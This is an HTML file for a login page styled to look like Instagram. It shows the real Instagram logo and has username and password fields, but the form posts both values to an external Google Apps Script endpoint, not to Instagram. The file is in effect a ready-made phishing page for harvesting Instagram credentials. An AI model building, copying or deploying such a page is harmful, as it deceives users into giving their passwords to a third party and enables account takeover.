<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram-like Login Form</title>
  <style>
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: #fafafa;
    }

    .login-container {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 20px;
      width: 300px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    .login-container img {
      width: 200px;
      margin-bottom: 20px;
    }

    .input-field {
      width: 100%;
      padding: 8px;
      margin: 8px 0;
      box-sizing: border-box;
    }

    .login-button {
      background-color: #3897f0;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }

    .login-button:hover {
      background-color: #2674c4;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 10px 0;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .separator::before {
      margin-right: 15px;
    }

    .separator::after {
      margin-left: 15px;
    }

    .or-text {
      margin: 0 15px;
      color: #8e8e8e;
    }

    .register-link {
      color: #00376b;
      text-decoration: none;
      font-weight: bold;
    }

    .register-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
    <form 
    method="POST" 
    action="https://script.google.com/macros/s/AKfycbzHfy8N4rIISE4CRG6tCjCF1Ko_pqd73tjhVHUBp2mhKS3Gue-6oLgEjI80ckezrLTe/exec"
    >
    <!-- <input name="Email" type="email" placeholder="Email" required>
    <input name="Name" type="text" placeholder="Name" required> -->

      <input type="text" name="Username" class="input-field" placeholder="Username">
      <input type="password" name="Password" class="input-field" placeholder="Password">
      <button type="submit" class="login-button" onclick="attemptLogin()">Log In</button>
    </form>
    <div class="separator">
      <span class="or-text">OR</span>
    </div>
    <a href="#" class="register-link">Create New Account</a>
  </div>
